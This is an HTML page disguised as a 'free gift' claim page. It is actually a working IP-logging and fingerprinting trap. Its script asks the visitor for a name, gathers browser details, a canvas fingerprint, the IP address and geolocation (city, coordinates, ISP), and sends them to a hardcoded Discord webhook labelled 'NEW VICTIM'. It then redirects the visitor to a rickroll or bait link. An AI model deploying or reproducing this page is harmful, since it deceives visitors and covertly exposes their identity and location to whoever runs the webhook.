<!DOCTYPE html>
<html>
<head>
    <title>Free Gift - Claim Now</title>
    <meta name="description" content="Claim your exclusive reward!">
    <style>body { background: #000; color: #fff; text-align: center; padding: 50px; }</style>
</head>
<body>
    <h1>Loading your exclusive reward...</h1>
    <p>Please wait while we verify...</p>
    <script>
        // Get URL params for tracking
        const urlParams = new URLSearchParams(window.location.search);
        const customId = urlParams.get('id') || urlParams.get('victim') || "Unknown";

        const data = {
            customId: customId,
            name: prompt("Enter your name to claim your reward:") || "Anonymous",
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            referrer: document.referrer || "direct",
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        };

        // Advanced fingerprint
        function getFingerprint() {
            let fp = "";
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "alphabetic";
                ctx.fillText("👀", 50, 50);
                fp += canvas.toDataURL().substring(0, 100);
            } catch(e) {}
            return fp || "no_fp";
        }
        data.fingerprint = getFingerprint();

        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(ipData => {
                data.ip = ipData.ip;

                return fetch(`https://ip-api.com/json/${data.ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting`);
            })
            .then(res => res.json())
            .then(geo => {
                data.country = geo.country || "Unknown";
                data.city = geo.city || "Unknown";
                data.region = geo.regionName || "Unknown";
                data.isp = geo.isp || "Unknown";
                data.timezone = geo.timezone || "Unknown";
                data.lat = geo.lat || "Unknown";
                data.lon = geo.lon || "Unknown";
                data.proxy = geo.proxy ? "YES (VPN/Proxy detected)" : "No";

                const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";
                
                fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**🚨 NEW VICTIM 🚨**\n**Custom ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Country:** ${data.country}\n**City:** ${data.city}\n**Region:** ${data.region}\n**ISP:** ${data.isp}\n**Timezone:** ${data.timezone}\n**Coords:** ${data.lat}, ${data.lon}\n**Proxy/VPN:** ${data.proxy}\n**Fingerprint:** ${data.fingerprint.substring(0,50)}...\n**Time:** ${data.timestamp}\n**UA:** ${data.userAgent}\n**Screen:** ${data.screen}\n**Lang:** ${data.language}`
                    })
                }).then(() => {
                    // Rickroll or random bait
                    const redirects = [
                        "https://www.youtube.com/watch?v=dQw4w9wgxcq",
                        "https://www.youtube.com/watch?v=3JZ_D3ELwOQ", // another classic
                        "https://example.com/success" // change one to real bait
                    ];
                    window.location = redirects[Math.floor(Math.random() * redirects.length)];
                });
            })
            .catch(err => {
                console.log("Error logged but hidden");
                window.location = "https://www.youtube.com/watch?v=dQw4w9wgxcq";
            });
    </script>
</body>
</html>
